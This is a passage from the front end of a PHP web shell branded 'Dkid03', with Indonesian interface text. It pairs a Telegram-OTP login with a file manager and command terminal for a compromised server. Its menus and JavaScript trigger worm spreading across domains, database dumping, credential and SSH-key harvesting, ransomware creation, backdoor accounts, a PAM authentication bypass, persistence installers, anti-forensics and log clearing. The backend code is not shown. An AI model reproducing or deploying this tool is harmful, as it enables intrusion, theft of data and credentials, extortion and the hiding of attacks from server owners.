        ::-webkit-scrollbar-thumb:hover { background:var(--text-muted); }
        @media(max-width:480px){ .table { font-size:0.7rem; } .table th, .table td { padding:3px 5px; } .action-links a { font-size:0.6rem; } }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['loggedin'])): ?>
        <div class="login-container">
            <div class="login-box">
                <h1 class="login-title">Dkid03</h1>
                <?php if (!empty($loginError)): ?>
                    <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
                <?php endif; ?>
                <?php if (!empty($loginSuccess)): ?>
                    <div class="alert alert-success"><?= htmlspecialchars($loginSuccess) ?></div>
                <?php endif; ?>
                <?php if (isset($_SESSION['logout_success'])): ?>
                    <div class="alert alert-success">✅ Anda berhasil logout <?php unset($_SESSION['logout_success']); ?></div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <button type="submit" name="request_otp" class="btn btn-block"><i class="fab fa-telegram"></i> Kirim OTP ke Telegram</button>
                    </div>
                </form>
                <?php if (isset($_SESSION['otp'])): ?>
                <hr style="border-color:var(--border); margin:15px 0;">
                <form method="post">
                    <div class="form-group">
                        <label for="otp">Masukkan Kode OTP</label>
                        <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digit" maxlength="6" required>
                    </div>
                    <button type="submit" name="verify_otp" class="btn btn-block">🔑 Login</button>
                </form>
                <?php endif; ?>
            </div>
        </div>
    <?php else: ?>
        <div class="app-container">
            <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('active')">
                <i class="fas fa-bars"></i>
            </button>
            <div class="sidebar">
                <div class="sidebar-header">
                    <h2 class="sidebar-title">💀 Dkid03</h2>
                    <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
                </div>
                <div class="sidebar-menu">
                    <div class="menu-section">
                        <div class="menu-title">📁 File</div>
                        <a href="?" class="menu-item"><i class="fas fa-folder"></i> Manager</a>
                        <div class="menu-item" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</div>
                        <div class="menu-item" onclick="showModal('createModal')"><i class="fas fa-file"></i> File</div>
                        <div class="menu-item" onclick="showModal('createFolderModal')"><i class="fas fa-folder"></i> Folder</div>
                        <div class="menu-item" onclick="showModal('bulkDeleteModal')"><i class="fas fa-trash-alt"></i> Bulk Delete</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">🪱 WORM</div>
                        <div class="menu-item" onclick="runWorm()"><i class="fas fa-bug"></i> Worm Spread</div>
                        <div class="menu-item" onclick="runWormInfectAll()" style="color:#ff4444;"><i class="fas fa-bug"></i> Infect All Domains</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">💀 ONE CLICK</div>
                        <div class="menu-item" onclick="runOneClickNoWorm()" style="color:#ff8800;">
                            <i class="fas fa-rocket"></i> ONE CLICK
                        </div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">⚡ System</div>
                        <a href="?terminal" class="menu-item"><i class="fas fa-terminal"></i> Terminal</a>
                        <div class="menu-item" onclick="runDump()"><i class="fas fa-database"></i> Dump DB</div>
                        <div class="menu-item" onclick="runHarvest()"><i class="fas fa-key"></i> Harvest</div>
                        <div class="menu-item" onclick="runCpanel()"><i class="fas fa-server"></i> cPanel</div>
                        <div class="menu-item" onclick="runConfigFinder()"><i class="fas fa-file-alt"></i> Sensitive</div>
                        <div class="menu-item" onclick="runCreateRansom()"><i class="fas fa-skull"></i> Ransom</div>
                        <div class="menu-item" onclick="runWPScan()"><i class="fab fa-wordpress"></i> WP Scan</div>
                        <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
                        <div class="menu-item" onclick="runBackdoorUser()"><i class="fas fa-user-plus"></i> Backdoor User</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">🛡️ Security</div>
                        <div class="menu-item" onclick="runSelfDestruct()"><i class="fas fa-skull-crossbones"></i> Self-Destruct</div>
                        <div class="menu-item" onclick="runAntiForensic()"><i class="fas fa-broom"></i> Anti-Forensic</div>
                        <div class="menu-item" onclick="runBypassSuhosin()"><i class="fas fa-shield-alt"></i> Bypass Suhosin</div>
                        <div class="menu-item" onclick="runCreateFTP()"><i class="fas fa-folder-open"></i> FTP Account</div>
                        <div class="menu-item" onclick="runCreateMail()"><i class="fas fa-envelope"></i> Mail Account</div>
                        <div class="menu-item" onclick="runDeepPersistence('install')"><i class="fas fa-shield-alt"></i> Deep Persistence</div>
                        <div class="menu-item" onclick="runDeepPersistence('remove')"><i class="fas fa-shield-alt"></i> Remove Deep Persistence</div>
                        <div class="menu-item" onclick="runPamBypass('install')"><i class="fas fa-key"></i> PAM Bypass</div>
                        <div class="menu-item" onclick="runPamBypass('remove')"><i class="fas fa-key"></i> Remove PAM Bypass</div>
                        <div class="menu-item" onclick="runUserPersistence('install')"><i class="fas fa-user"></i> User Persistence</div>
                        <div class="menu-item" onclick="runUserPersistence('remove')"><i class="fas fa-user"></i> Remove User Persistence</div>
                        <div class="menu-item" onclick="runListSpread()"><i class="fas fa-list"></i> List Spread</div>
                        <div class="menu-item" onclick="runSystemCache()"><i class="fas fa-sync-alt"></i> Cache Repair</div>
                        <div class="menu-item" onclick="runClearLogs()"><i class="fas fa-eraser"></i> Clear Logs</div>
                    </div>
                    <div class="menu-section">
                        <div class="menu-title">🚪 Exit</div>
                        <a href="?logout" class="menu-item logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
                    </div>
                </div>
            </div>

            <div class="main-content">
                <?php if (isset($_GET['terminal'])): ?>
                    <div class="terminal-container">
                        <?php $sysInfo = getSystemInfo(); ?>
                        <div class="card">
                            <div class="card-header"><span>📊 System Info</span></div>
                            <div class="card-body">
                                <?php foreach ($sysInfo as $label => $value): ?>
                                <div style="display:flex;border-bottom:1px solid var(--border);padding:4px 0;font-size:0.8rem;">
                                    <span style="width:140px;color:var(--text-muted);"><?= htmlspecialchars($label) ?>:</span>
                                    <span><?= htmlspecialchars($value) ?></span>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                        <div class="card">
                            <div class="card-header"><span>🖥️ Terminal</span></div>
                            <div class="card-body">
                                <?php if (!$terminalActive): ?>
                                    <div class="alert alert-danger">❌ Terminal tidak aktif.</div>
                                <?php endif; ?>
                                <div class="terminal-output"><?= htmlspecialchars($terminalOutput) ?: '✅ Ready.' ?></div>
                                <form method="post" class="terminal-input">
                                    <input type="text" name="command" class="form-control" placeholder="ls -la" autocomplete="off" <?= $terminalActive ? '' : 'disabled' ?>>
                                    <button type="submit" name="run_command" class="btn" <?= $terminalActive ? '' : 'disabled' ?>>▶ Run</button>
                                </form>
                            </div>
                        </div>
                    </div>
                <?php else: ?>
                    <div style="margin-bottom:12px;">
                        <h1 style="font-size:1.3rem;font-weight:500;color:var(--accent);text-align:center;">🔹 Dkid03 Access</h1>
                    </div>
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger">❌ <?= htmlspecialchars($error) ?></div>
                    <?php endif; ?>
                    <?php if (isset($success)): ?>
                        <div class="alert alert-success">✅ <?= htmlspecialchars($success) ?></div>
                    <?php endif; ?>
                    <div class="breadcrumb">
                        <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            <span>📂 Files</span>
                            <span><?= count(scandir($currentPath)) - 2 ?> items</span>
                        </div>
                        <div class="card-body">
                            <table class="table">
                                <thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
                                <tbody>
                                    <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
                                        <tr><td><a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="folder">📁 ..</a></td><td>-</td><td>-</td><td>-</td></tr>
                                    <?php endif; ?>
                                    <?php
                                    $items = @scandir($currentPath) ?: [];
                                    foreach ($items as $item) {
                                        if ($item === '.' || $item === '..') continue;
                                        $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                                        $isDir = is_dir($itemPath);
                                        $size = $isDir ? '-' : formatSize(@filesize($itemPath));
                                        $perms = @fileperms($itemPath);
                                        $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
                                    ?>
                                        <tr>
                                            <td>
                                                <?php if ($isDir): ?>
                                                    <a href="?path=<?= urlencode($itemPath) ?>" class="folder"><i class="fas fa-folder file-icon"></i><?= htmlspecialchars($item) ?></a>
                                                <?php else: ?>
                                                    <span class="file"><i class="fas fa-file file-icon"></i><?= htmlspecialchars($item) ?></span>
                                                <?php endif; ?>
                                            </td>
                                            <td><?= $size ?></td>
                                            <td><?= $permsFormatted ?></td>
                                            <td class="action-links">
                                                <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)): ?>
                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')"> Edit</a>
                                                <?php endif; ?>
                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')"> Rename</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>"> DL</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')"> CHMOD</a>
                                            </td>
                                        </tr>
                                    <?php } ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- MODALS -->
        <div id="createModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📄 New File</h2><button class="modal-close" onclick="hideModal('createModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><label>File Name</label><input type="text" name="name" class="form-control" placeholder="nama_file.php" required></div>
                        <input type="hidden" name="type" value="file"><input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">✅ Create</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="createFolderModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📁 New Folder</h2><button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><label>Folder Name</label><input type="text" name="name" class="form-control" placeholder="nama_folder" required></div>
                        <input type="hidden" name="type" value="folder"><input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">✅ Create</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="uploadModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">📤 Upload</h2><button class="modal-close" onclick="hideModal('uploadModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" enctype="multipart/form-data" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><input type="file" name="upload[]" class="form-control" multiple required></div>
                        <div class="form-group">
                            <label><input type="radio" name="upload_mode" value="normal" checked> Normal</label>
                            <label><input type="radio" name="upload_mode" value="bulk_shallow"> Shallow</label>
                            <label><input type="radio" name="upload_mode" value="bulk_deep"> Deep</label>
                        </div>
                        <button type="submit" class="btn btn-block">📤 Upload</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="bulkDeleteModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">🗑️ Bulk Delete</h2><button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><textarea name="file_list" class="form-control" rows="6" placeholder="file1.php&#10;file2.txt&#10;folder/"></textarea></div>
                        <div class="form-group">
                            <label><input type="radio" name="delete_mode" value="current" checked> Current</label>
                            <label><input type="radio" name="delete_mode" value="shallow"> Shallow</label>
                            <label><input type="radio" name="delete_mode" value="deep"> Deep</label>
                        </div>
                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">Delete</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title"> Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
                        <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
                        <button type="submit" class="btn btn-block">Rename</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="editModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title"> Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><textarea id="fileContent" name="content" class="form-control" style="min-height:200px;font-family:monospace;"></textarea></div>
                        <input type="hidden" id="editFileName" name="file"><input type="hidden" name="save_file" value="1">
                        <button type="submit" class="btn btn-block">💾 Save</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
                <div class="modal-body">
                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                        <div class="form-group"><input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required></div>
                        <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
                        <button type="submit" class="btn btn-block">✅ Change</button>
                    </form>
                </div>
            </div>
        </div>

        <div id="cpanelModal" class="modal">
            <div class="modal-content">
                <div class="modal-header"><h2 class="modal-title">🗄️ cPanel</h2><button class="modal-close" onclick="hideModal('cpanelModal')">&times;</button></div>
                <div class="modal-body">
                    <div class="form-group">
                        <select id="cpanelAction" class="form-control" onchange="toggleCpanelFields()">
                            <option value="list">List Accounts</option>
                            <option value="create">Create Account</option>
                            <option value="passwd">Change Password</option>
                            <option value="backup">Backup Account</option>
                            <option value="delete">Delete Account</option>
                        </select>
                    </div>
                    <div id="cpanelFields" style="display:none;">
                        <div class="form-group"><input type="text" id="cpanelUser" class="form-control" placeholder="Username"></div>
                        <div class="form-group" id="cpanelExtraGroup"><input type="text" id="cpanelExtra" class="form-control" placeholder="Extra Parameters"></div>
                    </div>
                    <button onclick="runCpanelSubmit()" class="btn btn-block">🚀 Execute</button>
                </div>
            </div>
        </div>

        <script>
            function showModal(id){document.getElementById(id).classList.add('active');}
            function hideModal(id){document.getElementById(id).classList.remove('active');}
            
            function editFile(f){
                if(f==='<?= basename(__FILE__) ?>'){alert('⚠️ Tidak bisa mengedit file ini.');return;}
                fetch('?path=<?= urlencode($currentPath) ?>&edit='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('fileContent').value=d;document.getElementById('editFileName').value=f;showModal('editModal');}).catch(()=>alert('Error'));
            }
            function showRename(n){if(n){document.getElementById('newName').value=n;document.getElementById('renameTarget').value=n;showModal('renameModal');}}
            function showChmod(n,p){if(n){document.getElementById('permission').value=p;document.getElementById('chmodTarget').value=n;showModal('chmodModal');}}

            function toggleCpanelFields(){
                var action=document.getElementById('cpanelAction').value;
                var fields=document.getElementById('cpanelFields');
                if(action==='list'){fields.style.display='none';}else{fields.style.display='block';}
                if(action==='delete'){document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="keep (opsional)">';}
                else if(action==='create'){document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="domain password plan">';}
                else{document.getElementById('cpanelExtraGroup').innerHTML='<input type="text" id="cpanelExtra" class="form-control" placeholder="param">';}
            }

            function runCpanelSubmit(){
                var action=document.getElementById('cpanelAction').value;
                var user=document.getElementById('cpanelUser').value||'';
                var extra=document.getElementById('cpanelExtra').value||'';
                if(action==='list'){fetch('?cpanel=1&action=list').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
                else{fetch('?cpanel=1&action='+encodeURIComponent(action)+'&user='+encodeURIComponent(user)+'&extra='+encodeURIComponent(extra)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
                hideModal('cpanelModal');
            }

            function runWorm(){if(confirm('Yakin?')){fetch('?worm=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runWormInfectAll(){if(confirm('🪱 INFECT ALL DOMAINS?')){fetch('?worm_infect_all=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runOneClickNoWorm(){if(confirm('ONE CLICK ALL?')){if(confirm('KONFIRMASI AKHIR!')){window.location.href='?one_click_no_worm=1&confirm=yes';}}}
            function runDump(){if(confirm('Dump database?')){fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runHarvest(){if(confirm('Harvest?')){fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCpanel(){showModal('cpanelModal');}
            function runConfigFinder(){if(confirm('Cari file sensitif?')){fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateRansom(){if(confirm('Buat ransomware?')){fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runWPScan(){if(confirm('Scan WP/Laravel?')){fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runSSHKeys(){if(confirm('Ambil SSH keys?')){fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runBackdoorUser(){var u=prompt('Username:');if(u){var p=prompt('Password:');fetch('?backdooruser=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runSystemCache(){if(confirm('Cache repair?')){fetch('?cache_repair=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runClearLogs(){if(confirm('Clear logs?')){fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runListSpread(){fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}
            function runSelfDestruct(){if(confirm('HAPUS SCRIPT INI?')){window.location.href='?selfdestruct=1&confirm=yes';}}
            function runAntiForensic(){if(confirm('Anti-forensic?')){fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runBypassSuhosin(){if(confirm('Bypass Suhosin?')){fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateFTP(){var u=prompt('Username:');if(u){var p=prompt('Password:');var h=prompt('Home:','/home/'+u);fetch('?create_ftp=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')+'&home='+encodeURIComponent(h)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateMail(){var e=prompt('Email:');if(e){var p=prompt('Password:');fetch('?create_mail=1&email='+encodeURIComponent(e)+'&pass='+encodeURIComponent(p||'')+'&domain='+encodeURIComponent(e.split('@')[1]||window.location.hostname)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runDeepPersistence(action){var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?';if(confirm(msg)){fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runPamBypass(action){if(action==='install'){var pass=prompt('Backdoor password:')||'BackdoorPass123';if(confirm('Install PAM bypass?')){fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}else{if(confirm('Remove PAM bypass?')){fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}}
            function runUserPersistence(action){var msg=action==='install'?'Install user persistence?':'Remove user persistence?';if(confirm(msg)){fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}

            window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
            <?php if(isset($_GET['edit'])): ?><?php $file=$_GET['edit']; $filePath=$currentPath.DIRECTORY_SEPARATOR.$file; $content=(file_exists($filePath)&&is_file($filePath)&&isSafePath($filePath,$rootPath,$specialDirectories)&&in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),$editableExtensions))?@file_get_contents($filePath):''; ?>document.addEventListener('DOMContentLoaded',function(){document.getElementById('fileContent').value=<?= json_encode($content) ?>;document.getElementById('editFileName').value=<?= json_encode($file) ?>;showModal('editModal');});<?php endif; ?>
            document.querySelector('a[href="?logout"]')?.addEventListener('click',function(e){e.preventDefault();if(confirm('Yakin logout?')){window.location.href='?logout=1';}});
        </script>
    <?php endif; ?>
</body>
</html>
